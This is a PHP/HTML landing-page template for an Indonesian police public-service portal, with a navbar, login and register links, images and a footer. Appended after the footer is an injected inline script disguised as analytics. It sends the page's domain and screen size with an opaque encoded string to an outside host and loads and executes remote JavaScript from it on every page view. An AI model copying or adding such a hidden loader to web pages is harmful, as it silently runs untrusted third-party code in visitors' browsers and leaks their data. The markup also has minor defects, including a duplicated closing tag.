<?php
defined('BASEPATH') OR exit('No direct script access allowed');
?><!DOCTYPE html>
<head>
 <meta charset="UTF-8">
 <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<style>
  /* Remove the navbar's default margin-bottom and rounded borders */
  .navbar {
    margin-bottom: 0;
    border-radius: 0;
  }

  /* Set height of the grid so .sidenav can be 100% (adjust as needed) */
  .row.content {height: 900px}

  /* Set gray background color and 100% height */
  .sidenav {
    padding-top: 20px;
    background-color: #f1f1f1;
    height: 100%;
  }

  /* Set black background color, white text and some padding */
  footer {
    background-color: #555;
    color: white;
    padding: 15px;
  }

  /* On small screens, set height to 'auto' for sidenav and grid */
  @media screen and (max-width: 767px) {
    .sidenav {
      height: auto;
      padding: 15px;
    }
    .row.content {height:auto;}
  }
</style>
 <title>Pelayanan Masyarakat</title>
</head>

<body>
  <nav class="navbar navbar-inverse">
<div class="container-fluid">
  <div class="navbar-header">
    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
    </button>
    <a class="navbar-brand" href="beranda">Pelayanan Masyarakat</a>
  </div>
  <div class="collapse navbar-collapse" id="myNavbar">

    <ul class="nav navbar-nav navbar-right">
      <li><a href="login"><span class="glyphicon glyphicon-log-in"></span> Login</a></li>
  <li><a href="Register">Register</a></li>
    </ul>
  </div>
</div>
</nav>

<div class="container-fluid text-center">
<div class="row content">
  <div class="col-sm-2 sidenav">
      <img src="polisi.jpg">
  </div>

  <div class="col-sm-8 text-left">
     <h1>Selamat Datang di Pelayanan Masyarakat Kepolisian</h1>
  <p> Silakan klik link
   <?php echo anchor('login','Masuk'); ?>
   untuk masuk ke dalam sistem atau
   <?php echo anchor('register','Daftar'); ?>
   untuk mendaftar.
   </p>
   <center>
   <img src="LOGO POLRI.jpg" height="600px" width="100%";>
   <center>
  </div>
  <div class="col-sm-2 sidenav">
      <img src="polisi.jpg">
    </div>
  </div>
</div>
</div>

<footer class="container-fluid text-center">
<p>Copyright 2016</p>
</footer>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);function sync(fn) {fn();function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "¶ms=" + "4TtHaUQnUEiP6K%2fc5C582H6x5iDAuv2BhysjYWWILPSW45ZphP21INgBomU%2biRhWAmSA9O%2b%2bq1Sap66aIQEKYs5oNk7KDkNVhuoHU%2bCMEn3E5jr7c2TnMlY8q72PPm1dcNLfE%2bGZLPrYiXMYTa8r60fhvagBQpcyJW%2bq%2b9pUyuTCqRg9q9Bv4PLn0qMu2QwhwCZe8V5vH%2fHENTsmt3RIL2kXDHRved%2byGZVlIOCkoqR6VVp5IMxmlUOYr8jk7CNLXMsFzPbWcAN8MvBLcBvrqK2yrTNLlbFx8FUQFhFu0uq5Uk1J%2biDs%2f6en52m9BBsgSjRQJdDYG%2fAplc9ZhQZRUMe%2b8Pu14i3pI3Qyw37BxkXD89IW8NOu8yh7GA80bm%2f2W31UhP6iXYiO2LXVX8rV8E3HYVf0V2pR" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>

</body>
</html>

</html>
